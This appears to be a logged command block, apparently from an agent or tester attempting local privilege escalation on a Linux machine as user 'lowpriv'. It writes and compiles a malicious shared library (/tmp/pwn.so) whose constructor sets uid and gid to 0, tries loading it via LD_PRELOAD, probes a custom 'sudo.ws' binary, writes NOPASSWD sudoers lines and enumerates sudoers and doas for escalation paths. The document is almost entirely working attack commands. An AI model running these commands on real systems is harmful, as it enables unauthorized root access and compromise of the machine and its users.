commands:
strings /usr/bin/sudo.ws | grep -iE 'system|exec|bash|sh|perl|python|env' | head -10 && LD_PRELOAD=/tmp/pwn.so /usr/bin/id 2>&1 || echo "trying sudo.ws with env"; echo '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init(){setuid(0);setgid(0);system("id");}' > /tmp/pwn.c; gcc -shared -fPIC -o /tmp/pwn.so /tmp/pwn.c 2>/dev/null; /usr/bin/sudo.ws /usr/bin/id 2>&1 || /usr/bin/sudo.ws -l 2>&1 || find /usr/bin/sudo.ws -exec file {} \; && echo "trying sudo.ws as NOPASSWD if possible:" && echo "lowpriv ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_backup && echo "lowpriv ALL=(ALL) NOPASSWD: /usr/bin/sudo.ws" > /tmp/test_sudoers && /usr/bin/sudo.ws -l 2>&1; grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null; ls -la /usr/bin/doas; cat /usr/bin/doas; doas id 2>&1

